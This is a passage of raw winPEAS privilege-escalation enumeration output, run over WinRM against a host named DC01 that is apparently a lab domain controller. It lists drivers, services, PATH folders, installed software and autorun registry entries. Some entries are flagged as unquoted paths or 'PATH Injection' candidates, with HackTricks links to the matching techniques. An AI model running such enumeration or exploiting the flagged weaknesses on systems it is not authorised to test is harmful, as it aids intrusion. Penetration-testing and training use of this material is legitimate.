WINRM       172.16.55.128   5985   DC01                 @nete1g3e.inf,%e1000.Service.DispName%;Intel(R) PRO/1000 NDIS 6 Adapter Driver(Intel Corporation - @nete1g3e.inf,%e1000.Service.DispName%;Intel(R) PRO/1000 NDIS 6 Adapter Driver)[C:\Windows\System32\drivers\E1G6032E.sys] - System                           
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i68x64.sys] - System                                                                                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(Marvell Semiconductor Inc. - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot                                                        
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @netevbd0a.inf,%vbd_srv_desc%;QLogic Legacy Ethernet Adapter VBD(QLogic Corporation - @netevbd0a.inf,%vbd_srv_desc%;QLogic Legacy Ethernet Adapter VBD)[System32\drivers\evbd0a.sys] - Boot                                                                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System               
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System                      
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot                                                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot                                                                 
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System                                           
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System                                                        
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System                                                                                  
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 NDKPerf Driver(NDKPerf Driver)[system32\drivers\NDKPerf.sys] - System                                                                                   
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @pvscsii.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver(VMware, Inc. - @pvscsii.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver)[System32\drivers\pvscsii.sys] - Boot                                                                            
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD(Marvell Semiconductor Inc. - @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD)[System32\drivers\qevbda.sys] - Boot                                                                         
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver(Marvell Semiconductor Inc. - @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver)[System32\drivers\qefcoe.sys] - Boot                                                                                               
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver(Marvell Semiconductor Inc. - @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver)[System32\drivers\qeois.sys] - Boot                                                                                          
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(Marvell Semiconductor Inc. - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot              
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot                                                       
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot                                  
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 SQL Server Agent (MSSQLSERVER)(SQL Server Agent (MSSQLSERVER))["C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER] - System                                                                                     
WINRM       172.16.55.128   5985   DC01                 Executes jobs, monitors SQL Server, fires alerts, and allows automation of some administrative tasks.                                                   
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual                                          
WINRM       172.16.55.128   5985   DC01                 Agent to hold private keys used for public key authentication.                                                                                          
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @Usb4HostRouter.inf,%Usb4HostRouter.SVCDESC%;USB4 Host Router Service(@Usb4HostRouter.inf,%Usb4HostRouter.SVCDESC%;USB4 Host Router Service)[C:\Windows\System32\drivers\Usb4HostRouter.sys] - System                                                           
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System                                                        
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload                                                                              
WINRM       172.16.55.128   5985   DC01                 Alias Manager and Ticket Service
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload                                                                   
WINRM       172.16.55.128   5985   DC01                 @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information                                          
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(Broadcom Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot                                                                                  
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 VMware Host Guest Client Redirector(VMware, Inc. - VMware Host Guest Client Redirector)[system32\DRIVERS\vmhgfs.sys] - System                           
WINRM       172.16.55.128   5985   DC01                 Implements the VMware HGFS protocol. This protocol provides connectivity to host files provided by the HGFS server.                                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload                                        
WINRM       172.16.55.128   5985   DC01                 Driver to provide enhanced memory management of this virtual machine.                                                                                   
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System                                                                                         
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 VMware Physical Disk Helper(VMware, Inc. - VMware Physical Disk Helper)[C:\Windows\system32\DRIVERS\vmrawdsk.sys] - System                              
WINRM       172.16.55.128   5985   DC01                 VMware Physical Disk Helper
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload                                               
WINRM       172.16.55.128   5985   DC01                 Provides support for synchronizing objects between the host and guest operating systems.                                                                
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System                                                                        
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot                                                                              
WINRM       172.16.55.128   5985   DC01                 vSockets Driver
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot                                  
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\Windows\System32\drivers\vwifibus.sys] - System   
WINRM       172.16.55.128   5985   DC01                 @%SystemRoot%\System32\drivers\vwifibus.sys,-258
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System                 
WINRM       172.16.55.128   5985   DC01                 @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices                                                                                             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System                                                                                      
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
WINRM       172.16.55.128   5985   DC01             È Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services              
WINRM       172.16.55.128   5985   DC01                 You cannot modify any service
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry                                                                                                 
WINRM       172.16.55.128   5985   DC01             È Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions                                                                            
WINRM       172.16.55.128   5985   DC01                 [-] Looks like you cannot change the registry of any service...                                                                                         
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)                                                                                     
WINRM       172.16.55.128   5985   DC01             È Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking     
WINRM       172.16.55.128   5985   DC01                 C:\Windows\system32
WINRM       172.16.55.128   5985   DC01                 C:\Windows
WINRM       172.16.55.128   5985   DC01                 C:\Windows\System32\Wbem
WINRM       172.16.55.128   5985   DC01                 C:\Windows\System32\WindowsPowerShell\v1.0\
WINRM       172.16.55.128   5985   DC01                 C:\Windows\System32\OpenSSH\
WINRM       172.16.55.128   5985   DC01                 C:\Program Files (x86)\Microsoft SQL Server\160\Tools\Binn\                                                                                             
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft SQL Server\160\Tools\Binn\                                                                                                   
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\                                                                                   
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft SQL Server\160\DTS\Binn\                                                                                                     
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
WINRM       172.16.55.128   5985   DC01               [X] Exception: Object reference not set to an instance of an object.                                                                                      
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--                                                                                
WINRM       172.16.55.128   5985   DC01             È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications   
WINRM       172.16.55.128   5985   DC01                 C:\Program Files (x86)\Microsoft Visual Studio\Installer                                                                                                
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Common Files
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\desktop.ini
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Internet Explorer
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft SQL Server
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft SQL Server Management Studio 21                                                                                              
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft Visual Studio 10.0
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Microsoft.NET
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\ModifiableWindowsApps
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\PackageManagement
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Uninstall Information
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\VMware
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Windows Defender
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Windows Defender Advanced Threat Protection                                                                                            
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Windows Mail
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Windows Media Player
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Windows NT
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Windows Photo Viewer
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\Windows Sidebar
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\WindowsApps
WINRM       172.16.55.128   5985   DC01                 C:\Program Files\WindowsPowerShell
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
WINRM       172.16.55.128   5985   DC01             È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                                                                                           
WINRM       172.16.55.128   5985   DC01             Error getting autoruns from WMIC: System.Management.ManagementException: Access denied                                                                      
WINRM       172.16.55.128   5985   DC01                at System.Management.ThreadDispatch.Start()
WINRM       172.16.55.128   5985   DC01                at System.Management.ManagementScope.Initialize()
WINRM       172.16.55.128   5985   DC01                at System.Management.ManagementObjectSearcher.Initialize()                                                                                               
WINRM       172.16.55.128   5985   DC01                at System.Management.ManagementObjectSearcher.Get()                                                                                                      
WINRM       172.16.55.128   5985   DC01                at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()                                                                                               
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run                                                                                             
WINRM       172.16.55.128   5985   DC01                 Key: SecurityHealth
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\system32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\system32\SecurityHealthSystray.exe
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run                                                                                             
WINRM       172.16.55.128   5985   DC01                 Key: VMware User Process
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Program Files\VMware\VMware Tools
WINRM       172.16.55.128   5985   DC01                 File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders                                                                          
WINRM       172.16.55.128   5985   DC01                 Key: Common Startup
WINRM       172.16.55.128   5985   DC01                 Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup                                                                                    
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders                                                                     
WINRM       172.16.55.128   5985   DC01                 Key: Common Startup
WINRM       172.16.55.128   5985   DC01                 Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup                                                                                    
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon                                                                                     
WINRM       172.16.55.128   5985   DC01                 Key: Userinit
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\system32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\system32\userinit.exe,
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon                                                                                     
WINRM       172.16.55.128   5985   DC01                 Key: Shell
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: explorer.exe
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot                                                                                                 
WINRM       172.16.55.128   5985   DC01                 Key: AlternateShell
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: cmd.exe
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers                                                                                 
WINRM       172.16.55.128   5985   DC01                 Key: Adobe Type Manager
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: atmfd.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers                                                                     
WINRM       172.16.55.128   5985   DC01                 Key: Adobe Type Manager
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: atmfd.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: aux
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: midi
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: midimapper
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: midimap.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: mixer
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: msacm.imaadpcm
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: imaadp32.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: msacm.l3acm
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\System32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\System32\l3codeca.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: msacm.msadpcm
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msadp32.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: msacm.msg711
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msg711.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
